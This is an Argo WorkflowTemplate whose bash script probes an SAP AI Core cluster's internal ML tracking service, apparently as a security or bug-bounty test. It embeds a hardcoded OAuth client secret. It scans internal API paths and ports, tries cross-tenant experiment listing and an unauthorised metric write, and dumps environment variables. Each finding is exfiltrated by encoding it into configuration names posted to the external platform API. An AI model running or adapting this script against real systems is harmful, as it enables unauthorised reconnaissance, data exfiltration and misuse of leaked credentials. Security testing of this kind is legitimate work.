apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "54.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V54: Hit the REAL internal tracking API at ml-tracking-service
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v54-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        # The real tracking endpoint injected by platform
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        TRACK_IP=$(dig +short "ml-tracking-service.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
        save "track-ip-${TRACK_IP:-NXDOMAIN}"

        # 1. Hit the tracking API root
        echo "=== TRACKING ROOT ===" >&2
        R=$(curl -sk --connect-timeout 5 "${TRACK}/" 2>&1 | head -c 200)
        save "track-root-$(echo $R | head -c 150)"

        # 2. Common MLflow/tracking API paths
        for path in /api/v1 /api/2.0/mlflow /api/2.0/mlflow/experiments/list /api/2.0/mlflow/runs/search /api/2.0/mlflow/registered-models/list /api/v1/experiments /api/v1/runs /health /healthz /version /metrics; do
          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
            SAFEPATH=$(echo "$path" | tr '/' '-')
            save "track${SAFEPATH}-$(echo $R | head -c 130)"
          fi
        done

        # 3. Try with execution ID header (might scope data)
        EXEC_ID=$(printenv AICORE_EXECUTION_ID 2>/dev/null)
        save "real-exec-id-${EXEC_ID}"

        # Try listing ALL experiments (cross-tenant test)
        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" -H "X-Execution-Id: ${EXEC_ID}" 2>&1 | head -c 200)
        save "track-experiments-$(echo $R | head -c 150)"

        # 4. Try different ports
        if [ -n "$TRACK_IP" ]; then
          for port in 80 8080 5000 3000 9090 8888; do
            R=$(curl -sk --connect-timeout 2 "http://${TRACK_IP}:${port}/" 2>&1 | head -c 150)
            if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
              save "track-port-${port}-$(echo $R | head -c 100)"
            fi
          done
        fi

        # 5. Try posting a metric (write access test)
        R=$(curl -sk --connect-timeout 5 -X POST "${TRACK}/api/v1/metrics" \
          -H "Content-Type: application/json" \
          -d '{"execution_id":"'${EXEC_ID}'","metrics":[{"name":"test_metric","value":1.0,"step":0}]}' 2>&1 | head -c 200)
        save "track-write-$(echo $R | head -c 150)"

        # 6. SAP-specific tracking API (not standard MLflow)
        for path in /v1/metrics /v1/executions /v1/tracking /v2/lm/metrics; do
          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
            SAFEPATH=$(echo "$path" | tr '/' '-')
            save "sap-track${SAFEPATH}-$(echo $R | head -c 130)"
          fi
        done

        # 7. Also check what other env vars the platform injected
        ALL_ENV=$(env | sort | grep -iv "password\|secret\|key\|CSC\|CID" | head -40 | tr '\n' '|')
        # Split into chunks
        echo "$ALL_ENV" | head -c 200 | while IFS= read -r chunk; do
          save "env-1-${chunk}"
        done
        echo "$ALL_ENV" | tail -c 200 | while IFS= read -r chunk; do
          save "env-2-${chunk}"
        done

        echo "V54 DONE" >&2
